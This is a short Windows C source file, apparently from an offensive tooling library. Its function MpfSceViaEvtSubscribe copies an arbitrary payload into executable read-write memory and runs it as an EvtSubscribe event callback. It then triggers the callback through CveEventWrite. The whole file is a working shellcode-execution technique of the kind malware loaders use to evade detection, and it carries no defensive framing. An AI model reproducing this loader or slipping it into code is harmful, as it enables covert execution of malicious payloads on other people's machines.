#include "Win32Helper.h"

VOID InvokeEvtSubscribeCallbackRoutine(LPVOID lpParameter)
{
	EVT_HANDLE hEvent = NULL;

	hEvent = EvtSubscribe(NULL, NULL, L"Application", L"*[System/EventID=1]", NULL, NULL, (EVT_SUBSCRIBE_CALLBACK)lpParameter, EvtSubscribeToFutureEvents);
	if (hEvent == NULL)
		goto EXIT_ROUTINE;

	if (CveEventWrite(L"2022-123456", L"Pseudo-random-string") != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	Sleep(10000); //arbitrary sleep time..

EXIT_ROUTINE:

	if(hEvent)
		EvtClose(hEvent);

	return;
}

BOOL MpfSceViaEvtSubscribe(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEvtSubscribeCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}